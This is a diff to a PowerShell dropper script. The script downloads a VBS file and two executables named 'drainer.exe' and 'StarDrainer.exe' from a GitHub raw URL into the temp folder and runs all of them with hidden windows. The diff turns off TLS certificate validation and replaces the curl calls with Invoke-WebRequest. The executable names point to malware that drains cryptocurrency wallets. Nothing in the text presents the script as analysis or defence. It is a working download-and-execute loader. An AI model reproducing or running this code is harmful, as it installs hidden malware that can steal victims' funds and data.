@@ -1,11 +1,14 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
+[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+
 $base = 'https://github.com/jesuss13377-source/123/raw/refs/heads/main/'
 $vbs = "$env:TEMP\script.vbs"
 $d1  = "$env:TEMP\drainer.exe"
 $d2  = "$env:TEMP\StarDrainer.exe"
 
-curl.exe -L -s -o $vbs "$base`script.vbs"
-curl.exe -L -s -o $d1  "$base`drainer.exe"
-curl.exe -L -s -o $d2  "$base`StarDrainer.exe"
+Invoke-WebRequest -Uri ($base + 'script.vbs') -OutFile $vbs -UseBasicParsing
+Invoke-WebRequest -Uri ($base + 'drainer.exe') -OutFile $d1 -UseBasicParsing
+Invoke-WebRequest -Uri ($base + 'StarDrainer.exe') -OutFile $d2 -UseBasicParsing
 
 if (Test-Path $vbs) { Start-Process -FilePath 'wscript.exe' -ArgumentList "`"$vbs`"" -WindowStyle Hidden }
 if (Test-Path $d1)  { Start-Process -FilePath $d1 -WindowStyle Hidden }
